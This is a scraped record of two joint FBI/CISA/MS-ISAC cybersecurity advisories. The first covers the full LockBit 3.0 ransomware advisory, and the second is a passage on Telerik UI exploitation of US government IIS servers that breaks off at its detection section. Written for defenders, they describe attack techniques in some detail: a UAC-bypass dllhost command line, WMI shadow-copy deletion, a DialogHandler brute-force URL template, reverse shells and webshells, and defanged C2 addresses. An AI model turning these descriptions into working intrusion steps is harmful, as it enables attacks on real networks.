The FBI, CISA, and MS-ISAC do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at report@cisa.gov. State, local, tribal, and territorial (SLTT) government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.
Your feedback is important. Please take a few minutes to share your opinions on this product through an anonymous Product Feedback Survey.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1071.002', 'T1490', 'TA0010', 'T1567', 'T1190', 'T1003.001', 'T1572', 'T1082', 'T1614.001', 'T1567.002', 'T1027', 'T1547', 'T1489', 'T1078', 'T1070.004', 'T1072', 'T1566', 'T1046', 'T1480.001', 'T1133', 'TA0002', 'T1491.001', 'T1189', 'T1021.001', 'T1486', 'TA0004', 'T1485', 'T1048'}","






Actions to take today to mitigate cyber threats from ransomware:




Prioritize remediating known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enable and enforce phishing-resistant multifactor authentication.







SUMMARY
Note: this joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing & Analysis Center (MS-ISAC) are releasing this joint CSA to disseminate known LockBit 3.0 ransomware IOCs and TTPs identified through FBI investigations as recently as March 2023.
The LockBit 3.0 ransomware operations function as a Ransomware-as-a-Service (RaaS) model and is a continuation of previous versions of the ransomware, LockBit 2.0, and LockBit. Since January 2020, LockBit has functioned as an affiliate-based ransomware variant; affiliates deploying the LockBit RaaS use many varying TTPs and attack a wide range of businesses and critical infrastructure organizations, which can make effective computer network defense and mitigation challenging.
The FBI, CISA, and the MS-ISAC encourage organizations to implement the recommendations in the mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report: 


#StopRansomware: Lockbit 3.0
(PDF,       688.70 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK for Enterprise.
CAPABILITIES
LockBit 3.0, also known as “LockBit Black,” is more modular and evasive than its previous versions and shares similarities with Blackmatter and Blackcat ransomware.
LockBit 3.0 is configured upon compilation with many different options that determine the behavior of the ransomware. Upon the actual execution of the ransomware within a victim environment, various arguments can be supplied to further modify the behavior of the ransomware. For example, LockBit 3.0 accepts additional arguments for specific operations in lateral movement and rebooting into Safe Mode (see LockBit Command Line parameters under Indicators of Compromise). If a LockBit affiliate does not have access to passwordless LockBit 3.0 ransomware, then a password argument is mandatory during the execution of the ransomware. LockBit 3.0 affiliates failing to enter the correct password will be unable to execute the ransomware,. The password is a cryptographic key which decodes the LockBit 3.0 executable. By protecting the code in such a manner, LockBit 3.0 hinders malware detection and analysis with the code being unexecutable and unreadable in its encrypted form. Signature-based detections may fail to detect the LockBit 3.0 executable as the executable’s encrypted potion will vary based on the cryptographic key used for encryption while also generating a unique hash. When provided the correct password, LockBit 3.0 will decrypt the main component, continue to decrypt or decompress its code, and execute the ransomware.
LockBit 3.0 will only infect machines that do not have language settings matching a defined exclusion list. However, whether a system language is checked at runtime is determined by a configuration flag originally set at compilation time. Languages on the exclusion list include, but are not limited to, Romanian (Moldova), Arabic (Syria), and Tatar (Russia). If a language from the exclusion list is detected, LockBit 3.0 will stop execution without infecting the system.
INITIAL ACCESS
Affiliates deploying LockBit 3.0 ransomware gain initial access to victim networks via remote desktop protocol (RDP) exploitation, drive-by compromise, phishing campaigns, abuse of valid accounts, and exploitation of public-facing applications,.
EXECUTION AND INFECTION PROCESS
During the malware routine, if privileges are not sufficient, LockBit 3.0 attempts to escalate to the required privileges,. LockBit 3.0 performs functions such as:

Enumerating system information such as hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices,
Terminating processes and services,
Launching commands,
Enabling automatic logon for persistence and privilege escalation,
Deleting log files, files in the recycle bin folder, and shadow copies residing on disk,

LockBit 3.0 attempts to spread across a victim network by using a preconfigured list of credentials hardcoded at compilation time or a compromised local account with elevated privileges,. When compiled, LockBit 3.0 may also enable options for spreading via Group Policy Objects and PsExec using the Server Message Block (SMB) protocol. LockBit 3.0 attempts to encrypt, data saved to any local or remote device, but skips files associated with core system functions.
After files are encrypted, LockBit 3.0 drops a ransom note with the new filename <Ransomware ID>.README.txt and changes the host’s wallpaper and icons to LockBit 3.0 branding,. If needed, LockBit 3.0 will send encrypted host and bot information to a command and control (C2) server,.
Once completed, LockBit 3.0 may delete itself from the disk, as well as any Group Policy updates that were made, depending on which options were set at compilation time.
EXFILTRATION
LockBit 3.0 affiliates use Stealbit, a custom exfiltration tool used previously with LockBit 2.0,; rclone, an open-source command line cloud storage manager,; and publicly available file sharing services, such as MEGA, to exfiltrate sensitive company data files prior to encryption. While rclone and many publicly available file sharing services are primarily used for legitimate purposes, they can also be used by threat actors to aid in system compromise, network exploration, or data exfiltration. LockBit 3.0 affiliates often use other publicly available file sharing services to exfiltrate data as well, (see Table 1).

LEVERAGING FREEWARE AND OPEN-SOURCE TOOLS
LockBit affiliates have been observed using various freeware and open-source tools during their intrusions. These tools are used for a range of activities such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration. Use of PowerShell and Batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation. Artifacts of professional penetration-testing tools such as Metasploit and Cobalt Strike have also been observed. See Table 2 for a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations:

Indicators of Compromise (IOCs)
The IOCs and malware characteristics outlined below were derived from field analysis. The following samples are current as of March 2023.
LockBit 3.0 Black Icon

 


LockBit 3.0 Wallpaper

 


LockBit Command Line Parameters

Mutual Exclusion Object (Mutex) Created
When executed, LockBit 3.0 will create the mutex, Global\<MD4 hash of machine GUID>,and check to see if this mutex has already been created to avoid running more than one instance of the ransomware.
UAC Bypass via Elevated COM Interface
LockBit 3.0 is capable of bypassing User Account Control (UAC) to execute code with elevated privileges via elevated Component Object Model (COM) Interface. C:\Windows\System32\dllhost.exe is spawned with high integrity with the command line GUID 3E5FC7F9-9A51-4367-9063-A120244FBEC.
For example, %SYSTEM32%\dllhost.exe/Processid:{3E5FC7F9-9A51-4367-9063- A120244FBEC7}.
Volume Shadow Copy Deletion
LockBit 3.0 uses Windows Management Instrumentation (WMI) to identify and delete Volume Shadow Copies. LockBit 3.0 uses select * from Win32_ShadowCopy to query for Volume Shadow copies, Win32_ShadowCopy.ID to obtain the ID of the shadow copy, and DeleteInstance to delete any shadow copies.
Registry Artifacts






Safe Mode Launch Commands
LockBit 3.0 has a Safe Mode feature to circumvent endpoint antivirus and detection. Depending upon the host operating system, the following command is launched to reboot the system to Safe Mode with Networking:


Group Policy Artifacts
The following are Group Policy Extensible Markup Language (XML) files identified after a LockBit 3.0 infection:

Services.xml stops and disables services on the Active Directory (AD) hosts.

Registry.pol
The following registry configuration changes values for the Group Policy refresh time, disable SmartScreen, and disable Windows Defender.

Force GPUpdate
Once new group policies are added, a PowerShell command using Group Policy update (GPUpdate) applies the new group policy changes to all computers on the AD domain.

Services Killed

Processes Killed

LockBit 3.0 Ransom Note

Network Connections
If configured, Lockbit 3.0 will send two HTTP POST requests to one of the C2servers. Information about the victim host and bot are encrypted with an Advanced Encryption Standard (AES) key and encoded in Base64.

User Agent Strings

MITRE ATT&CK TECHNIQUES
See Table 3 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.











MITIGATIONS
The FBI, CISA, and the MS-ISAC recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of LockBit 3.0’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers,CPG 7.3, in a physically separate, segmented, and secure location (e.g., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies,CPG 3.4,.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length,CPG 1.4,
Store passwords in hashed format using industry-recognized password managers
Add password user “salts” to shared login credentials
Avoid reusing passwords
Implement multiple failed login attempt account lockouts,CPG 1.1,
Disable password “hints”
Refrain from requiring password changes more frequently than once per year. Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software


Require phishing-resistant multifactor authentication,CPG 1.3, for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
Segment networks,CPG 8.1, to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network,CPG 5.1,. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 1.5,.
Disable unused ports.
Consider adding an email banner to emails,CPG 8.3, received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.
Maintain offline backups of data, and regularly maintain backup and restoration,CPG 7.3,. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 3.3,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and the MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and the MS-ISAC authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.To get started:

Select an ATT&CK technique described in this advisory (see Table 3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and the MS-ISAC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be legally shared, including:

Boundary logs showing communication to and from foreign IP addresses
Sample ransom note
Communications with LockBit 3.0 actors
Bitcoin wallet information
Decryptor files
Benign sample of an encrypted file

The FBI, CISA, and MS-ISAC do not encourage paying ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office or CISA at report@cisa.gov. State, local, tribal, and territorial (SLTT) government entities can also report to the MS-ISAC (SOC@cisecurity.org or 866-787-4722).
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, and the MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the FBI, CISA, or the MS-ISAC.
Your feedback is important. Please take a few minutes to share your opinions on this product through an anonymous Product Feedback Survey.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
31,"



SUMMARY
From November 2022 through early January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) and authoring organizations identified the presence of indicators of compromise (IOCs) at a federal civilian executive branch (FCEB) agency. Analysts determined that multiple cyber threat actors, including an advanced persistent threat (APT) actor, were able to exploit a .NET deserialization vulnerability (CVE-2019-18935) in Progress Telerik user interface (UI) for ASP.NET AJAX, located in the agency’s Microsoft Internet Information Services (IIS) web server. Successful exploitation of this vulnerability allows for remote code execution. According to Progress Software, Telerik UI for ASP.NET AJAX builds before R1 2020 (2020.1.114) are vulnerable to this exploit.[1]
Update June 15, 2023:
As of April 2023, forensic analysis conducted at an additional FCEB agency identified exploitation of CVE-2017-9248 in the agency’s IIS server by unattributed APT actors—specifically within the Telerik UI for ASP.NET AJAX DialogHandler component. This specific analysis is provided as context for existing vulnerabilities within Telerik UI for ASP.NET AJAX.
Update End
Actions to take today to mitigate malicious cyber activity:

Implement a patch management solution to ensure compliance with the latest security patches.
Validate output from patch management and vulnerability scanning against running services to check for discrepancies and account for all services.
Limit service accounts to the minimum permissions necessary to run services.

CISA, the Federal Bureau of Investigation (FBI), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint Cybersecurity Advisory (CSA) to provide IT infrastructure defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


Threat Actors Exploit Progress Telerik Vulnerabilities in Multiple U.S. Government IIS Servers
(PDF,       661.68 KB
  )


For a downloadable copy of IOCs, see below or the JSON file.


AA23-074A STIX XML
(XML,       30.96 KB
  )


For copies of the Malware Analysis Reports (MARs) accompanying this CSA:

MAR-10413062-1.v1 CVE-2019-18935 Exploitation in U.S. Government IIS Server
Update June 15, 2023: MAR-10443863-1.v1 CVE-2017-9248 Exploitation in U.S. Government IIS Server Update End

TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding detection and mitigation recommendations.
Overview
CISA and authoring organizations assess that, beginning as late as November 2022, threat actors successfully exploited a .NET deserialization vulnerability (CVE-2019-18935) in an instance of Telerik UI for ASP.NET AJAX Q2 2013 SP1 (version 2013.2.717) running on an FCEB agency’s Microsoft IIS server. This exploit, which results in interactive access with the web server, enabled the threat actors to successfully execute remote code on the vulnerable web server. Though the agency’s vulnerability scanner had the appropriate plugin for CVE-2019-18935, it failed to detect the vulnerability due to the Telerik UI software being installed in a file path it does not typically scan. This may be the case for many software installations, as file paths widely vary depending on the organization and installation method.
In addition to CVE-2019-18935, this version (2013.2.717) of Telerik UI for ASP.NET AJAX contains the following known vulnerabilities: CVE-2017-11357, CVE-2017-11317, and CVE-2017-9248.
Update June 15, 2023:
Forensic analysis conducted at an additional FCEB agency identified exploitation of CVE-2017-9248 in the agency’s IIS server by unattributed APT actors—specifically within the Telerik UI for ASP.NET AJAX DialogHandler component. Activity identified at this agency is separate from the CVE-2019-18935 exploitation listed above and throughout this CSA. Analysis is provided as context for existing vulnerabilities within Telerik UI for ASP.NET AJAX.
Analysis concluded the agency’s IIS server operated an outdated version of Telerik UI for ASP.NET AJAX (2009.3.1.1208.35), which was identified via the Telerik.Web.UI.dll file located in the server's .NET Framework directory. It should be noted that Telerik UI for ASP.NET AJAX versions prior to 2017.2.621 are considered cryptographically weak; this weakness is in the RadAsyncUpload function that uses encryption to secure uploaded files. Proof-of-concept code has been publicly available since January 2018.[2]
Note: The APT actors listed in this June 2023 update were observed leveraging virtual private servers (VPS) to route traffic to their target [T1583.003]. Due to the constant change incurred through use of different VPS infrastructures, the below timeline lists threat actor-controlled IPs that are likely only relevant for hunting during the specified narrow timeline of activity and are not recommended for blocking.
Table 1: Timeline of Unattributed APT Actor Activity (CVE-2017-9248)



Date
Event
Description


04/14/2023
Brute force attempts via dp_crypto.py

APT actors used dp_crypto.py, a Python-based cryptographic script, to initiate and successfully execute [T1059.006] a brute force attack against the encryption key used by the Telerik UI for ASP.NET AJAX DialogHandler. This activity was associated with the malicious IP 20.121.51[.]51.
Note: Each version of the DialogHandler has a distinct URL to reference and interact with, as well as unique security configurations. APT actors created URLs to target these individual versions and increase their likelihood of successfully exploiting any existing vulnerabilities.
In this instance, dp_crypto.py targeted versions of the DialogHandler and exploited version-specific vulnerabilities. Based on available proof-of-concept code, the target URL format that dp_crypto.py uses is:
<url_path>?DialogName=DocumentManager&renderMode=2&Skin=Default&Title=Document%20Manager&dpptn=&isRtl=false&dp=<dp_encrypted>



04/14/2023
Successful IIS server exploitation
APT actors exploited CVE-2017-9248 in the agency’s IIS server [T1190].


04/14/2023
Successful access of Document Manager

APT actors gained unauthorized access to the Document Manager component within Telerik UI for ASP.NET AJAX.
Note: Document Manager provides an interface for users to manage documents, such as uploading, downloading, editing, deleting, or organizing files. APT actors manipulated the Document Manager to upload malicious scripts, download and delete sensitive files, and make unauthorized modifications [T1105]. In more sophisticated attacks, cyber threat actors may use this access as means for lateral movement into an organization’s network.



04/14/2023
Done.html uploaded to IIS server
APT actors uploaded Done.html to the IIS server as means for confirming successful CVE-2017-9248 exploitation and file upload capabilities. Note: This file was not identified as malicious.


04/14/2023
sd.php and osker.aspx webshells uploaded to IIS server
APT actors uploaded malicious webshells [T1505.003] (sd.php, osker.aspx) for backdoor access and remote control. osker.aspx was accessed via malicious IP 207.244.71[.]81 until 04/15/2023, likely to maintain persistence or conduct further operations that were not identified during analysis.


04/14/2023
App_Web_jl37rjxu.dll created on IIS server
APT actors created App_Web_jl37rjxu.dll on the IIS server, which indicated code was successfully compiling or running.


04/15/2023
fassdfsdf.html uploaded to IIS server
APT actors uploaded fassdfsdf.html to the IIS server. This was likely used as a test file to validate successful file transfer.


04/17/2023
osker.aspx webshell accessed from different IP
APT actors accessed the osker.aspx webshell via malicious IP 162.210.194[.]10.



CISA and authoring organizations were unable to identify privilege escalation, lateral movement, or data exfiltration. However, the presence of webshells and file uploads indicated APT actors maintained access and had the potential to conduct additional malicious activity.
For more information on the identified malicious files from Table 1, see MAR-10443863-1.v1 CVE-2017-9248 Exploitation in U.S. Government IIS Server.
Update End
Analysis suggests that cyber threat actors exploited CVE-2019-18935 in conjunction with either CVE-2017-11357 or CVE-2017-11317. Australian Cyber Security Centre (ACSC) Advisory 2020-004 assesses that exploitation of CVE-2019-18935 is only possible with knowledge of Telerik RadAsyncUpload encryption keys.[3] Threat actors can obtain these keys through either prior knowledge or exploitation of vulnerabilities—CVE-2017-11357 or CVE-2017-11317—present in older, unpatched versions of Telerik released between 2007 and 2017. Forensic evidence is not available to definitively confirm exploitation of either CVE-2017-11357 or CVE-2017-11317.
Threat Actor Activity
CISA and authoring organizations observed multiple cyber threat actors, including an APT actor—hereafter referred to as Threat Actor 1 (TA1)—and known cybercriminal actor XE Group—hereafter referred to as Threat Actor 2 (TA2)—conducting reconnaissance and scanning activities [T1595.002] that correlate to the successful exploitation of CVE-2019-18935 in the agency’s IIS server running Telerik UI for ASP.NET AJAX [T1190].
When exploiting the vulnerability, the threat actors uploaded malicious dynamic-link library (DLL) files (some masqueraded as portable network graphics [PNG] files) [T1105] to the C:\Windows\Temp\ directory. The malicious files were then executed from the C:\Windows\Temp\ directory via the w3wp.exe process—a legitimate process that runs on IIS servers. This process is routine for handling requests sent to web servers and delivering content. The review of antivirus logs identified that some DLL files were created [T1055.001] and detected as early as August 2021.
CISA and authoring organizations confirmed that some malicious files dropped on the IIS server are consistent with a previously reported file naming convention that threat actors commonly use when exploiting CVE-2019-18935.[4] The threat actors name the files in the Unix Epoch time format and use the date and time as recorded on the target system. The file naming convention follows the pattern [10 digits].[7 digits].dll (e.g., a file created on October 31, 2022, could be 1667203023.5321205.dll).
The names of some of the PNG files were misleading. For example, file 1596835329.5015914.png, which decodes to August 7, 2020, 21:22:09 UTC, first appeared on October 13, 2022, but the file system shows a creation date of August 7, 2020. The uncorrelated Unix Epoch time format may indicate that the threat actors used the timestomping [T1070.006] technique. This file naming convention is a primary IOC used by the threat actors.
In many cases, malicious artifacts were not available for analysis because the threat actors’ malware—that looks for and removes files with the .dll file extension—removed files [T1070.004] from the C:\Windows\Temp\ directory. Through full packet data capture analysis and reverse engineering of malicious DLL files, no indications of additional malicious activity or sub-processes were found executed by the w3wp.exe process. CISA observed error messages being sent to the threat actors’ command and control (C2) server when permission restraints prevented the service account from executing the malicious DLLs and writing new files.
Network activity analysis was consistent with the artifacts provided for review. Analysts did not observe evidence of privilege escalation or lateral movement.
Threat Actor 1
CISA and authoring organizations observed TA1 exploiting CVE-2019-18935 for system enumeration beginning in August 2022. The vulnerability allows a threat actor to upload malicious DLLs on a target system and execute them by abusing a legitimate process, e.g., the w3wp.exe process. In this instance, TA1 was able to upload malicious DLL files to the C:\Windows\Temp\ directory and then achieve remote code execution, executing the DLL files via the w3wp.exe process.
At least nine DLL files used for discovery [TA0007], C2 [TA0011], and defense evasion [TA0005]. All of the analyzed samples have network parameters, including host name, domain name, Domain Name System (DNS) server Internet Protocol (IP) address and machine name, Network Basic Input/Output System (NetBIOS) ID, adapter information, IP address, subnet, gateway IP, and Dynamic Host Configuration Protocol (DHCP) server [T1016]. All analyzed samples communicate this collected data to a C2 server at IP address 137.184.130[.]162 or 45.77.212[.]12. The C2 traffic to these IP addresses uses a non-application layer protocol [T1095] by leveraging Transmission Control Protocol (TCP) clear text (i.e., unencrypted) over port 443. Analysis also identified that:

Some of the analyzed samples can load additional libraries; enumerate the system, processes, files, directories [T1083]; and write files.
Other analyzed samples can delete DLL files ending with the .dll extension in the C:\Windows\Temp\ directory on the server. TA1 may use this capability to hide additional malicious activity on the network.

CISA, in coordination with the authoring organizations, identified and observed the following threat actor IPs and timestamps associated with this activity:

Table 2: Observed TA1 IPs and Timestamps


IP Address
First Identified
Last Identified




137.184.130[.]162
09/26/2022
10/08/2022


45.77.212[.]12
10/07/2022
11/25/2022


104.225.129[.]102
10/10/2022
11/16/2022


149.28.85[.]24
10/12/2022
10/17/2022


185.186.245[.]72
10/18/2022
10/18/2022


193.8.172[.]113
09/25/2022
09/25/2022


193.8.172[.]13
09/25/2022
10/17/2022


216.120.201[.]12
10/13/2022
11/10/2022


5.34.178[.]246
09/25/2022
09/25/2022


79.133.124[.]242
09/25/2022
09/25/2022


92.38.169[.]193
09/27/2022
10/08/2022


92.38.176[.]109
09/12/2022
09/25/2022


92.38.176[.]130
09/25/2022
10/07/2022



Threat Actor 2
TA2—identified as likely the cybercriminal actor XE Group—often includes xe[word] nomenclature in original filenames and registered domains. Volexity lists this naming convention and other observed TTPs as common for this threat actor group.[5]]
As early as August 2021, CISA and authoring organizations observed TA2 delivering malicious PNG files that, following analysis, were masqueraded DLL files to avoid detection [T1036.005]. Similar to TA1, TA2 exploited CVE-2019-18935 and was able to upload at least three unique DLL files into the C:\Windows\Temp\ directory that TA2 executed via the w3wp.exe process. These DLL files drop and execute reverse (remote) shell utilities for unencrypted communication with C2 IP addresses associated with the malicious domains listed in Table 3. Note: At the time of analysis, the domains resolved to the listed IP addresses.

Table 3: TA2 IPs and Resolving Domains


IP Address
Resolving Domains




184.168.104[.]171

xework[.]com
xegroups[.]com
hivnd[.]com



144.96.103[.]245
xework[.]com



Analysis of DLL files determined the files listed in Table 4 were dropped, decoded, and attempted to connect to the respective malicious domains. Embedded payloads dropped by the DLL files were observed using the command line utility certutil[.]exe and writing new files as xesvrs[.]exe to invoke reverse shell utilities execution.

Table 4: Identified Malicious Files


Filename
Description




XEReverseShell.exe

DLL files (masqueraded as PNG files) located in the C:\Windows\Temp\ directory contain a base64 encoded file with the internal name XEReverseShell.exe, which was dropped into the same directory as sortcombat.exe.
When executed, the reverse shell utility attempts to connect to xework[.]com or xegroups[.]com to obtain the IP address of the C2 server and port number for unencrypted communication.
Note: It is likely the threat actors changed the file extension from .dll to .png to avoid detection.



Multi-OS_ReverseShell.exe

Reverse shell utility decoded from the base64 encoded file xesmartshell.tmp.
When executed, it will attempt to connect to xegroups[.]com or xework[.]com to obtain the IP address of the C2 server and port number for unencrypted communication.



SortVistaCompat
Base64 encoded payload dropped from Multi-OS_ReverseShell.exe. This file receives the C2 IP and port from xework[.]com.



 When the TA2 malware is executed a DLL file drops an executable (XEReverseShell.exe) that attempts to pull a C2 IP address and port number from xework[.]com or xegroups[.]com.

If no port or IP address is found, the program will exit.
If a port and IP address are found, the program will establish a listener and wait for further commands.

If communication is established between the TA2 malware and the C2:

The malware will identify the operating system (Windows or Linux) and create the appropriate shell (cmd or bash), sending system information back to the C2.
The C2 server may send the command xesetshell, causing the malware to connect to the server and download a file called small.txt—a base64-encoded webshell that the malware decodes and places in the C:\Windows\Temp\ directory.
The C2 server may send the command xequit, causing the malware to sleep for a period of time determined by the threat actors.

The two files xesmartshell.tmp and SortVistaCompat have the capability to drop an Active Server Pages (ASPX) webshell—a base64 encoded text file small.txt decoded [T1140] as small.aspx [T1505.003]—to enumerate drives; to send, receive, and delete files; and to execute incoming commands. The webshell contains an interface for easily browsing files, directories, or drives on the system, and allows the user to upload or download files to any directory. No webshells were observed to be dropped on the target system, likely due to the abused service account having restrictive write permissions.
For more information on the DLLs, binaries, and webshell, see CISA MAR-10413062-1.v1 CVE-2019-18935 Exploitation in U.S. Government IIS Server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 5-10 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.

Table 5: Identified ATT&CK Techniques for Enterprise


Reconnaissance
 
 


Initial Access
 
 


Persistence
 
 


Defense Evasion
 
 


Discovery
 
 


Command and Control
 
 




Technique Title
ID
Use


Active Scanning: Vulnerability Scanning
T1595.002
Actors were observed conducting active scanning activity for vulnerable devices and specific ports.


Technique Title
ID
Use


Exploit Public-Facing Application
T1190
Actors exploited a known vulnerability in the Microsoft IIS server.


Technique Title
ID
Use


Server Software Component: Web Shell
T1505.003
TA2’s malware dropped an ASPX webshell to enumerate drives; send, receive, and delete files; and execute commands.


Technique Title
ID
Use


Masquerading: Match Legitimate Name or Location
T1036.005
Actors leveraged the legitimate w3wp.exe process on the IIS server to write malicious DLL files and evade detection.


Process Injection: DLL Injection
T1055.001
Actors loaded newly created DLLs into a running w3wp.exe process.


Indicator Removal: File Deletion
T1070.004
TA1’s malware deleted files with "".dll"" from the C:\Windows\Temp\ directory, which may indicate hidden malicious activity on the network.


Indicator Removal: Timestomp
T1070.006
Actors modified file time attributes to insert misleading creation dates.


Decode Files
T1140
The base64 encoded text file small.txt decoded as the webshell small.aspx.


Technique Title
ID
Use


File and Directory Discovery
T1083

Actors enumerated the IIS server via OS fingerprinting, executed Windows processes, and collected network information.
TA1’s malware enumerates systems, processes, files, and directories.



System Network Configuration Discovery
T1016
TA1’s malware gathers network parameters, including host name, domain name, DNS servers, NetBIOS ID, adapter information, IP address, subnet, gateway IP, and DHCP server.


Technique Title
ID
Use


Ingress Tool Transfer
T1105
TA1 and TA2 uploaded malicious DLL files (some masqueraded as PNG files) to the C:\Windows\Temp\ directory.


Non-Application Layer Protocol
T1095
Actors used a non-application layer protocol (TCP) for w3wp.exe process exploitation, C2, and enumeration on the IIS server.



Update June 15, 2023:
Table 6: Resource Development



Technique Title
ID
Use


Acquire Infrastructure: Virtual Private Server
T1583.003
Unattributed APT actors were observed leveraging VPS to route traffic to targets.



Table 7: Initial Access



Technique Title
ID
Use


Exploit Public-Facing Application
T1190
APT actors exploited CVE-2017-9248 in an FCEB agency’s Microsoft IIS server.



Table 8: Execution



Technique Title
ID
Use


Command and Scripting Interpreter: Python
T1059.006
APT actors used a Python-based script to execute a brute force attack.



Table 9: Persistence



Technique Title
ID
Use


Server Software Component: Web Shell
T1505.003
APT actors uploaded malicious webshells (sd.php, osker.aspx) to the IIS server for backdoor access and remote control.



Table 10: Command and Control



Technique Title
ID
Use


Ingress Tool Transfer
T1105
APT actors manipulated the Document Manager to upload malicious scripts, download and delete sensitive files, and make unauthorized modifications.



Update End
DETECTION METHODS
